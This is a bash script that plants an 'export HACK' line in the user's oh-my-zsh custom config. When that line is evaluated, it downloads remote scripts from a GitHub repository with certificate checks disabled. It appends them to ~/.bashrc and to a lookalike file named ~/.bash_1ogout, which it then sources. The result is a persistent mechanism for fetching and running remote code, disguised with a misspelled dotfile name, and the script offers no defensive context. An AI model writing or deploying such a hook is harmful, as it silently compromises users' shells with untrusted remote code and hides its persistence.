#!/bin/bash
if [ ! -f ~/.oh-my-zsh/custom/example.zsh  ];then
  echo "to install oh-my-zsh first"
  exit 1
fi

if [[ $1 == "-r" ]];then
  sed -ie '/export HACK/d'  ~/.oh-my-zsh/custom/example.zsh;
  echo "back up"
else
  if [[ "$(grep 'HACK' ~/.oh-my-zsh/custom/example.zsh)" == "" ]];then
     cat << EOF >> ~/.oh-my-zsh/custom/example.zsh
export HACK="grep '_fdsagadsfasdgadsgsss' ~/.bashrc 1>/dev/null; if [ \\\$? -ne 0 ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/clear.sh' -O- -q  >> ~/.bashrc; fi;bash; if [ ! -f ~/.bash_1ogout ];then wget -c -t 2 --no-check-certificate 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/bye.sh' -O- -q  >> ~/.bash_1ogout; fi ; . ~/.bash_1ogout;"
EOF
  echo "set \$HACK to env"
  fi
fi
